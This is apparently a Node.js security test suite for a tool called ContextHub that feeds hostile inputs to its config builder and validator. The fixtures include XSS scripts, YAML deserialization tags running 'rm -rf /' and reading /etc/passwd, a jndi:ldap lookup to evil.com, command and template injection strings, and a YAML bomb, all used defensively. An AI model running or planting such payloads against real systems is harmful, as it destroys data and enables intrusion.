#!/usr/bin/env node

/**
 * Security test suite for input validation
 * Tests that ContextHub properly validates and sanitizes all user inputs
 */

const fs = require('fs').promises;
const { ConfigValidator } = require('../../scripts/validate-config.js');
const { ConfigBuilder } = require('../../scripts/build-configs.js');

const TEST_DIR = `test-security-input-${Date.now()}`;
let testsRun = 0;
let testsPassed = 0;
let testsFailed = 0;

const colors = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m'
};

const logInfo = (message) => {
  console.log(`${colors.blue}[SECURITY]${colors.reset} ${message}`);
};

const logSuccess = (message) => {
  console.log(`${colors.green}[PASS]${colors.reset} ${message}`);
  testsPassed++;
};

const logError = (message) => {
  console.log(`${colors.red}[FAIL]${colors.reset} ${message}`);
  testsFailed++;
};

const runTest = async (testName, testFn) => {
  testsRun++;
  logInfo(`Running security test: ${testName}`);

  try {
    await testFn();
    logSuccess(`✓ ${testName}`);
  } catch (error) {
    logError(`✗ ${testName}: ${error.message}`);
  }
};

// Setup test environment
const setupTestEnv = async () => {
  await fs.mkdir(TEST_DIR, { recursive: true });
  process.chdir(TEST_DIR);
};

// Cleanup test environment
const cleanupTestEnv = async () => {
  process.chdir('..');
  try {
    await fs.rm(TEST_DIR, { recursive: true, force: true });
  } catch (error) {
    console.warn(`Cleanup warning: ${error.message}`);
  }
};

// Test script injection in markdown
const testScriptInjection = async () => {
  const maliciousMarkdown = `# Malicious Configuration

## Project Overview
<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">

## Coding Standards
\`\`\`javascript
eval('malicious code');
\`\`\`

<!-- AI:CLAUDE -->
<script>console.log('injection attempt')</script>
<!-- /AI:CLAUDE -->

## Architecture
[Click me](javascript:alert('XSS'))

<iframe src="javascript:alert('XSS')"></iframe>
`;

  await fs.writeFile('malicious.md', maliciousMarkdown);

  const builder = new ConfigBuilder({
    source: 'malicious.md',
    output: '.',
    force: true,
    verbose: false
  });

  const success = await builder.build();

  if (!success) {
    throw new Error('Build failed unexpectedly');
  }

  // Check that generated files don't contain executable content
  const claudeContent = await fs.readFile('CLAUDE.md', 'utf8');

  if (claudeContent.includes('<script>') ||
      claudeContent.includes('javascript:') ||
      claudeContent.includes('onerror=')) {
    throw new Error('Executable content found in generated file');
  }

  // Content should be treated as text, not executed
  if (!claudeContent.includes('alert(')) {
    throw new Error('Content was unexpectedly filtered (should be preserved as text)');
  }
};

// Test YAML injection
const testYamlInjection = async () => {
  const maliciousYaml = `project:
  name: "Test Project"
  description: |
    '; DROP TABLE users; --
    \${system('rm -rf /')}
    <%=\`rm -rf /\`%>

coding_standards:
  - !!python/object/apply:os.system ["rm -rf /"]
  - !!python/object/apply:subprocess.check_output [["cat", "/etc/passwd"]]

tools:
  claude:
    instructions: |
      \${jndi:ldap://evil.com/malicious}
      #{2*2}
      {{7*7}}
      <% evil_code %>
`;

  await fs.writeFile('malicious.yml', maliciousYaml);

  try {
    const validator = new ConfigValidator({
      config: 'malicious.yml',
      strict: false,
      verbose: false
    });

    await validator.validate();

    // The validator should handle this safely
    // Even if validation passes, no code should be executed
  } catch (error) {
    // Expected behavior - malicious YAML should be rejected or cause safe parsing error
    if (!error.message.includes('YAML') && !error.message.includes('parsing')) {
      throw error;
    }
  }
};

// Test command injection
const testCommandInjection = async () => {
  const maliciousCommands = [
    '; rm -rf /',
    '| cat /etc/passwd',
    '&& curl evil.com',
    '`rm -rf /`',
    '$(rm -rf /)',
    '\'; DROP TABLE users; --',
    '\n/bin/sh'
  ];

  for (const command of maliciousCommands) {
    const maliciousConfig = `# Test Config

## Project Overview
Project with command: ${command}

## Architecture
${command}
`;

    await fs.writeFile(`malicious-cmd-${Date.now()}.md`, maliciousConfig);

    const builder = new ConfigBuilder({
      source: `malicious-cmd-${Date.now()}.md`,
      output: '.',
      force: true,
      verbose: false
    });

    // This should work without executing any commands
    const success = await builder.build();

    if (!success) {
      throw new Error('Build failed - commands may have been executed');
    }
  }
};

// Test template injection
const testTemplateInjection = async () => {
  const templateInjections = [
    '{{constructor.constructor("alert(1)")()}}',
    '${7*7}', // eslint-disable-line no-template-curly-in-string
    '#{7*7}',
    '<%= 7*7 %>',
    '{{7*7}}',
    '{% raw %}{{7*7}}{% endraw %}',
    '[[7*7]]',
    '((7*7))'
  ];

  for (const injection of templateInjections) {
    const maliciousConfig = `# Template Injection Test

## Project Overview
Test: ${injection}

<!-- AI:CLAUDE -->
Instructions: ${injection}
<!-- /AI:CLAUDE -->
`;

    await fs.writeFile(`template-${Date.now()}.md`, maliciousConfig);

    const builder = new ConfigBuilder({
      source: `template-${Date.now()}.md`,
      output: '.',
      force: true,
      verbose: false
    });

    const success = await builder.build();

    if (!success) {
      throw new Error('Template injection may have caused execution');
    }

    // Check that template expressions are not evaluated
    const claudeContent = await fs.readFile('CLAUDE.md', 'utf8');
    if (claudeContent.includes('49') && !claudeContent.includes('7*7')) {
      throw new Error('Template injection was evaluated');
    }
  }
};

// Test billion laughs attack (XML/YAML bomb)
const testBillionLaughs = async () => {
  const billionLaughsYaml = `
lol: &lol "lol"
lol2: &lol2 [*lol, *lol, *lol, *lol, *lol, *lol, *lol, *lol, *lol]
lol3: &lol3 [*lol2, *lol2, *lol2, *lol2, *lol2, *lol2, *lol2, *lol2, *lol2]
lol4: &lol4 [*lol3, *lol3, *lol3, *lol3, *lol3, *lol3, *lol3, *lol3, *lol3]
lol5: &lol5 [*lol4, *lol4, *lol4, *lol4, *lol4, *lol4, *lol4, *lol4, *lol4]
lol6: &lol6 [*lol5, *lol5, *lol5, *lol5, *lol5, *lol5, *lol5, *lol5, *lol5]
lol7: &lol7 [*lol6, *lol6, *lol6, *lol6, *lol6, *lol6, *lol6, *lol6, *lol6]
lol8: &lol8 [*lol7, *lol7, *lol7, *lol7, *lol7, *lol7, *lol7, *lol7, *lol7]
lol9: &lol9 [*lol8, *lol8, *lol8, *lol8, *lol8, *lol8, *lol8, *lol8, *lol8]
`;

  await fs.writeFile('billion-laughs.yml', billionLaughsYaml);

  const startTime = Date.now();

  try {
    const validator = new ConfigValidator({
      config: 'billion-laughs.yml',
      strict: false,
      verbose: false
    });

    // Set a timeout to prevent hanging
    const timeoutPromise = new Promise((_resolve, reject) => {
      setTimeout(() => reject(new Error('Timeout')), 5000);
    });

    await Promise.race([
      validator.validate(),
      timeoutPromise
    ]);
  } catch (error) {
    const duration = Date.now() - startTime;

    if (duration > 10000) {
      throw new Error('Billion laughs attack caused excessive processing time');
    }

    // Expected behavior - should timeout or fail gracefully
    if (!error.message.includes('Timeout') &&
        !error.message.includes('memory') &&
        !error.message.includes('size')) {
      throw error;
    }
  }
};

// Test large file handling
const testLargeFileHandling = async () => {
  // Create a very large configuration file
  let largeContent = '# Large Configuration\n\n';

  // Add 10MB of content
  const chunk = 'A'.repeat(1024); // 1KB
  for (let i = 0; i < 10240; i++) { // 10MB
    largeContent += `## Section ${i}\n${chunk}\n`;
  }

  await fs.writeFile('large.md', largeContent);

  const startTime = Date.now();

  try {
    const builder = new ConfigBuilder({
      source: 'large.md',
      output: '.',
      force: true,
      verbose: false
    });

    // Set a timeout
    const timeoutPromise = new Promise((_resolve, reject) => {
      setTimeout(() => reject(new Error('Timeout')), 10000);
    });

    await Promise.race([
      builder.build(),
      timeoutPromise
    ]);

    const duration = Date.now() - startTime;

    if (duration > 30000) {
      throw new Error('Large file processing took too long');
    }
  } catch (error) {
    if (error.message.includes('too large') ||
        error.message.includes('size limit') ||
        error.message.includes('Timeout')) {
      // Expected behavior - large files should be handled gracefully
      return;
    }
    throw error;
  }
};

// Test special characters and encoding
const testSpecialCharacters = async () => {
  const specialChars = `# Special Characters Test

## Project Overview
Unicode: ∀x∈ℝ, ∑∞n=1, ∆±∞, πε∅∈∉⊂⊃∩∪
Emoji: 🚀🔒💻🛡️⚡🎯🔧📊✅❌
Control chars: \x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F
High Unicode: 𝕏𝕐𝕑𝔸𝔹ℂ𝔻𝔼𝔽𝔾ℍ𝕀𝕁𝕂𝕃𝕄ℕ𝕆ℙℚℝ𝕊𝕋𝕌𝕍𝕎

<!-- AI:CLAUDE -->
Special instructions with weird chars: ±∞≠≤≥∝∼≈∆∇∂∫∮∑∏
<!-- /AI:CLAUDE -->
`;

  await fs.writeFile('special-chars.md', specialChars, 'utf8');

  const builder = new ConfigBuilder({
    source: 'special-chars.md',
    output: '.',
    force: true,
    verbose: false
  });

  const success = await builder.build();

  if (!success) {
    throw new Error('Special characters caused build failure');
  }

  // Verify special characters are preserved
  const claudeContent = await fs.readFile('CLAUDE.md', 'utf8');
  if (!claudeContent.includes('∀x∈ℝ') || !claudeContent.includes('🚀')) {
    throw new Error('Special characters not preserved correctly');
  }
};

// Test malformed input handling
const testMalformedInput = async () => {
  const malformedInputs = [
    '\xFF\xFE\x00\x00invalid utf-8',
    'invalid\x00null\x00bytes',
    Buffer.from([0xFF, 0xFE, 0xBF, 0xBF]).toString('binary'),
    '# Valid start\n\x00\x01\x02invalid content',
    '# Config\n\uFFFD\uFFFE\uFFFF'
  ];

  for (let i = 0; i < malformedInputs.length; i++) {
    const filename = `malformed-${i}.md`;

    try {
      await fs.writeFile(filename, malformedInputs[i]);

      const builder = new ConfigBuilder({
        source: filename,
        output: '.',
        force: true,
        verbose: false
      });

      await builder.build();

      // Should handle malformed input gracefully without crashing
    } catch (error) {
      // Expected behavior - malformed input should be rejected gracefully
      if (!error.message.includes('encoding') &&
          !error.message.includes('invalid') &&
          !error.message.includes('malformed')) {
        throw error;
      }
    }
  }
};

// Main test execution
const main = async () => {
  console.log('ContextHub Security Test Suite - Input Validation');
  console.log('==================================================');
  console.log('');

  try {
    await setupTestEnv();

    // Run all security tests
    await runTest('Script Injection Protection', testScriptInjection);
    await runTest('YAML Injection Protection', testYamlInjection);
    await runTest('Command Injection Protection', testCommandInjection);
    await runTest('Template Injection Protection', testTemplateInjection);
    await runTest('Billion Laughs Attack Protection', testBillionLaughs);
    await runTest('Large File Handling', testLargeFileHandling);
    await runTest('Special Characters Handling', testSpecialCharacters);
    await runTest('Malformed Input Handling', testMalformedInput);
  } finally {
    await cleanupTestEnv();
  }

  // Print summary
  console.log('');
  console.log('Security Test Summary');
  console.log('====================');
  console.log(`Tests run: ${testsRun}`);
  console.log(`Tests passed: ${testsPassed}`);
  console.log(`Tests failed: ${testsFailed}`);

  if (testsFailed === 0) {
    logSuccess('All security tests passed! ✅');
    process.exit(0);
  } else {
    logError('Some security tests failed! ❌');
    process.exit(1);
  }
};

// Handle cleanup on exit
process.on('exit', cleanupTestEnv);
process.on('SIGINT', () => {
  cleanupTestEnv().then(() => process.exit(1));
});
process.on('SIGTERM', () => {
  cleanupTestEnv().then(() => process.exit(1));
});

// Run tests
if (require.main === module) {
  main().catch(error => {
    console.error('Security test suite failed:', error);
    cleanupTestEnv().then(() => process.exit(1));
  });
}

module.exports = {
  setupTestEnv,
  cleanupTestEnv,
  testScriptInjection,
  testYamlInjection,
  testCommandInjection
};
